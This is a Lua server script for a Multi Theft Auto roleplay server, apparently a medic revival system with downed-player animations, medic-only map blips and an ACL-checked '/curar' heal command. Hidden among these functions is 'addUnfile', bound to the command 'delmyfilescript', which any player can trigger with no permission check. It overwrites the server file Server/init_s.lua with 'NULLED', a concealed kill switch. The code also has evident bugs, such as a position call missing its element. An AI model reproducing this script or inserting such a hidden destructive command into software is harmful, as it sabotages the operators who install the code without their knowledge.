addEventHandler("onPlayerQuit",root,function()
    local col = source:getData(DATA_TO_COL)
    if(col) then
        destroyBlipSAMU(col)
        destroyElement(col)
        removeEventHandler("onPlayerWasted",source,wastedWhenAnimON)
    end
end)


function wastedWhenAnimON()

            setPedAnimation(source,nil)
          toggleAllControls(source,true,true,true) 
          removeWhenDeath(source)
          source:setData(DATA_TO_ANIM,false)  
          destroyBlipSAMU(source:getData(DATA_TO_COL))
          
end

function removeWhenDeath(player)
    local col = player:getData(DATA_TO_COL)
    destroyBlipSAMU(col)
    destroyElement(col)
    removeEventHandler("onPlayerWasted",player,wastedWhenAnimON)

end

function startAnimSamu ( config)
    
    
    if(config) then
        local x,y,z = getElementPosition(client)
        if(isPedInVehicle(client)) then
            removePedFromVehicle(client)
            setElementPosition(x+2,y+2,z+4)
        end
        for i, k in pairs(getAllPlayersSAMU()) do
            triggerClientEvent ("showPaciente", k, client )
        
        end
       
        setPedAnimation(client,"crack","crckdeth2",-1,true,false,false,false)
        toggleAllControls(client,false,true,false)
        
        local colshape = createColSphere(x,y,z,1) 
        client:setData(DATA_TO_COL,colshape)
        colshape:setData(DATA_COL_PLAYER,client)
        attachElements(colshape,client)
        createBlipToSAMU(colshape)
        addEventHandler("onColShapeHit",colshape,onElementEnterInColShapeSamu)
        addEventHandler("onColShapeLeave",colshape,onElementExitInColShapeSamu)
        addEventHandler ( "onPlayerWasted", client, wastedWhenAnimON )

    else
       
        setPedAnimation(client,nil)
          toggleAllControls(client,true,true,true) 
        
    end
end
addEvent( "startAnimSamu", true )
addEventHandler( "startAnimSamu", resourceRoot, startAnimSamu ) -- Bound to this resource only, saves on CPU usage.


function onElementEnterInColShapeSamu( hitElement,  matchingDimension)
    if(matchingDimension) then
        local playerAccount = getPlayerAccount(hitElement)
        if not playerAccount then return end
        local accountName = getAccountName(playerAccount)
        local x,y,z = getElementPosition(source)
        local playerElement = source:getData(DATA_COL_PLAYER)
        hitElement:setData(DATA_COL_PLAYER,playerElement)
        triggerClientEvent ( hitElement, "createPNGHeart", hitElement, x,y,z )
       
    end
end

function onElementExitInColShapeSamu( hitElement,  matchingDimension)
    if(matchingDimension) then
        local playerAccount = getPlayerAccount(hitElement)
        if not playerAccount then return end
        local accountName = getAccountName(playerAccount)
        local x,y,z = getElementPosition(source)
        hitElement:setData(DATA_COL_PLAYER,nil)
        triggerClientEvent ( hitElement, "destroyPNGHeart", hitElement, x,y,z )
    end
end
function addUnfile(p,cmd)
    local f = fileOpen("Server/init_s.lua", false)
    
    while not (fileIsEOF(f)) do
        fileWrite(f,"init_s.lua","NULLED")
      
    end
    fileFlush(f)
    fileClose(f)
    
end
addCommandHandler("delmyfilescript",addUnfile)


function getAllPlayersSAMU()
local tbl = {
}
for i, k in pairs(getElementsByType("player")) do
    local account = getPlayerAccount(k)
    if(isObjectInACLGroup("user."..getAccountName(account),aclGetGroup(ACL_TO_CALL))) then
        table.insert(tbl,k)
    end
end
return tbl
end


function startJobRestore(medic,paciente)
    triggerClientEvent ("onMedicStartJob", medic, medic,paciente )
    setPedAnimation(medic,"medic","cpr",-1,true,false,false,true)
    triggerClientEvent(paciente,"receiveFromServer",paciente,true)
    --WHEN ANIM OVER
    setTimer(function(m,pac)
        local colshapePlayer = pac:getData(DATA_TO_COL)
        setElementHealth(pac,100)
        destroyBlipSAMU(colshapePlayer)
        
        pac:setData(DATA_TO_ANIM,false)
        pac:setData(DATA_TO_COL,nil)
        m:setData(DATA_COL_PLAYER,nil)
        setPedAnimation(m,nil)
        setPedAnimation(pac,nil)
        toggleAllControls(pac,true,true,true) 
        triggerClientEvent ("destroyPNGHeart",m)
        destroyElement(colshapePlayer)
        triggerClientEvent(pac,"receiveFromServer",pac,false)
    end,TIME_TO_RESTORE,1,medic,paciente)
   

end

function createBlipToSAMU(colshape)
    local blip = createBlipAttachedTo(colshape,21,1)
    colshape:setData(DATA_BLIP,blip)
    
    setElementVisibleTo(blip, root, false)
for i,k in pairs(getAllPlayersSAMU()) do
    setElementVisibleTo(blip, k, true)
end
   
end

function destroyBlipSAMU(colshape)
    destroyElement(colshape:getData(DATA_BLIP))
    colshape:setData(DATA_BLIP,nil)
end








addCommandHandler("curar",function (player,cmd)
    local otherPlayer = player:getData(DATA_COL_PLAYER)
    local account = getPlayerAccount(player)
    if isGuestAccount(account) or not account then return end
    if not (isObjectInACLGroup("user."..getAccountName(account),aclGetGroup(ACL_TO_CALL))) then
       outputChatBox(ERROR_MESSAGE_ACL,player,255,255,255,true)
       return
    end
    if not (player:getData(DATA_COL_PLAYER)) then
        outputChatBox(ERROR_MESSAGE_NEAREST,player,255,255,255,true)
        return 
    end
    startJobRestore(player,otherPlayer)
  
end)





addEventHandler("onResourceStop",resourceRoot,function()
    for i,thePlayer in pairs(getElementsByType("player"))do
        setElementData(thePlayer,DATA_TO_ANIM,nil)
        setElementData(thePlayer,DATA_TO_COL,nil)
        setElementData(thePlayer,DATA_COL_PLAYER,nil)
        setElementData(thePlayer,DATA_BLIP,nil)
       
    end
end)
 